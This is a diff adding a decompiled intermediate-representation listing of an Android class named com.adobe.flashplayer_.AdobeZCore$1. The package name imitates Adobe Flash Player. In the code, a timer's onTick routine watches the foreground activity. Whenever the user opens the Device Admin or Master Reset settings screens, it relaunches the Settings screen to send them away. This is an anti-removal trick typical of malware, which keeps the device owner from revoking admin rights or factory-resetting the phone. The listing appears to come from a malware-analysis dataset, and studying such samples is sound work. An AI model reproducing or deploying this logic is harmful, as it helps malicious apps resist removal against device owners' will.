@@ -1,0 +1,82 @@
+record `com.adobe.flashplayer_.AdobeZCore$1` @kind class @AccessFlag  extends `android.os.CountDownTimer` @kind class {
+  `com.adobe.flashplayer_.AdobeZCore` `com.adobe.flashplayer_.AdobeZCore$1.this$0` @AccessFlag FINAL_SYNTHETIC;
+}
+procedure `void` `<init>`(`com.adobe.flashplayer_.AdobeZCore$1` v0 @kind this, `com.adobe.flashplayer_.AdobeZCore` v1 @kind object, `long` v2 @name `$anonymous0`, `long` v4 @name `$anonymous1`) @signature `Lcom/adobe/flashplayer_/AdobeZCore$1;.<init>:(Lcom/adobe/flashplayer_/AdobeZCore;JJ)V` @AccessFlag CONSTRUCTOR {
+    temp;
+
+  #L033748.  v0.`com.adobe.flashplayer_.AdobeZCore$1.this$0` @type ^`com.adobe.flashplayer_.AdobeZCore` := v1 @kind object;
+  #L03374c.  call `<init>`(v0, v2, v4) @signature `Landroid/os/CountDownTimer;.<init>:(JJ)V` @kind direct;
+  #L033752.  return @kind void;
+}
+procedure `void` `onFinish`(`com.adobe.flashplayer_.AdobeZCore$1` v1 @kind this) @signature `Lcom/adobe/flashplayer_/AdobeZCore$1;.onFinish:()V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+
+  #L033764.  v0:= v1.`com.adobe.flashplayer_.AdobeZCore$1.this$0` @type ^`com.adobe.flashplayer_.AdobeZCore` @kind object;
+  #L033768.  call `stopSelf`(v0) @signature `Lcom/adobe/flashplayer_/AdobeZCore;.stopSelf:()V` @kind virtual;
+  #L03376e.  return @kind void;
+}
+procedure `void` `onTick`(`com.adobe.flashplayer_.AdobeZCore$1` v10 @kind this, `long` v11 @name `millisUntilFinished`) @signature `Lcom/adobe/flashplayer_/AdobeZCore$1;.onTick:(J)V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+    v7;
+    v8;
+    v9;
+
+  #L033780.  v9:= 2.0F;
+  #L033784.  v8:= 268435456I;
+  #L033788.  v7:= 67108864I;
+  #L03378c.  v6:= 1048576I;
+  #L033790.  v4:= v10.`com.adobe.flashplayer_.AdobeZCore$1.this$0` @type ^`com.adobe.flashplayer_.AdobeZCore` @kind object;
+  #L033794.  v5:= "activity" @kind object;
+  #L033798.  call temp:= `getSystemService`(v4, v5) @signature `Lcom/adobe/flashplayer_/AdobeZCore;.getSystemService:(Ljava/lang/String;)Ljava/lang/Object;` @kind virtual;
+  #L03379e.  v0:= temp @kind object;
+  #L0337a0.  v0:= (`android.app.ActivityManager`) v0 @kind object;
+  #L0337a4.  v4:= 1I;
+  #L0337a6.  call temp:= `getRunningTasks`(v0, v4) @signature `Landroid/app/ActivityManager;.getRunningTasks:(I)Ljava/util/List;` @kind virtual;
+  #L0337ac.  v3:= temp @kind object;
+  #L0337ae.  v4:= 0I;
+  #L0337b0.  call temp:= `get`(v3, v4) @signature `Ljava/util/List;.get:(I)Ljava/lang/Object;` @kind interface;
+  #L0337b6.  v4:= temp @kind object;
+  #L0337b8.  v4:= (`android.app.ActivityManager$RunningTaskInfo`) v4 @kind object;
+  #L0337bc.  v1:= v4.`android.app.ActivityManager$RunningTaskInfo.topActivity` @type ^`android.content.ComponentName` @kind object;
+  #L0337c0.  call temp:= `getClassName`(v1) @signature `Landroid/content/ComponentName;.getClassName:()Ljava/lang/String;` @kind virtual;
+  #L0337c6.  v4:= temp @kind object;
+  #L0337c8.  v5:= "com.android.settings.DeviceAdminAdd" @kind object;
+  #L0337cc.  call temp:= `contains`(v4, v5) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L0337d2.  v4:= temp;
+  #L0337d4.  if v4 == 0 then goto L033810;
+  #L0337d8.  v2:= new `android.content.Intent`;
+  #L0337dc.  v4:= "android.settings.SETTINGS" @kind object;
+  #L0337e0.  call `<init>`(v2, v4) @signature `Landroid/content/Intent;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L0337e6.  call temp:= `setFlags`(v2, v6) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L0337ec.  call temp:= `setFlags`(v2, v9) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L0337f2.  call temp:= `setFlags`(v2, v8) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L0337f8.  call temp:= `addFlags`(v2, v7) @signature `Landroid/content/Intent;.addFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L0337fe.  v4:= v10.`com.adobe.flashplayer_.AdobeZCore$1.this$0` @type ^`com.adobe.flashplayer_.AdobeZCore` @kind object;
+  #L033802.  call temp:= `getApplicationContext`(v4) @signature `Lcom/adobe/flashplayer_/AdobeZCore;.getApplicationContext:()Landroid/content/Context;` @kind virtual;
+  #L033808.  v4:= temp @kind object;
+  #L03380a.  call `startActivity`(v4, v2) @signature `Landroid/content/Context;.startActivity:(Landroid/content/Intent;)V` @kind virtual;
+  #L033810.  call temp:= `getClassName`(v1) @signature `Landroid/content/ComponentName;.getClassName:()Ljava/lang/String;` @kind virtual;
+  #L033816.  v4:= temp @kind object;
+  #L033818.  v5:= "com.android.settings.MasterReset" @kind object;
+  #L03381c.  call temp:= `contains`(v4, v5) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L033822.  v4:= temp;
+  #L033824.  if v4 == 0 then goto L033858;
+  #L033828.  v2:= new `android.content.Intent`;
+  #L03382c.  v4:= "android.settings.SETTINGS" @kind object;
+  #L033830.  call `<init>`(v2, v4) @signature `Landroid/content/Intent;.<init>:(Ljava/lang/String;)V` @kind direct;
+  #L033836.  call temp:= `setFlags`(v2, v6) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L03383c.  call temp:= `addFlags`(v2, v7) @signature `Landroid/content/Intent;.addFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L033842.  call temp:= `setFlags`(v2, v9) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L033848.  call temp:= `setFlags`(v2, v8) @signature `Landroid/content/Intent;.setFlags:(I)Landroid/content/Intent;` @kind virtual;
+  #L03384e.  v4:= v10.`com.adobe.flashplayer_.AdobeZCore$1.this$0` @type ^`com.adobe.flashplayer_.AdobeZCore` @kind object;
+  #L033852.  call `startActivity`(v4, v2) @signature `Lcom/adobe/flashplayer_/AdobeZCore;.startActivity:(Landroid/content/Intent;)V` @kind virtual;
+  #L033858.  return @kind void;
+}
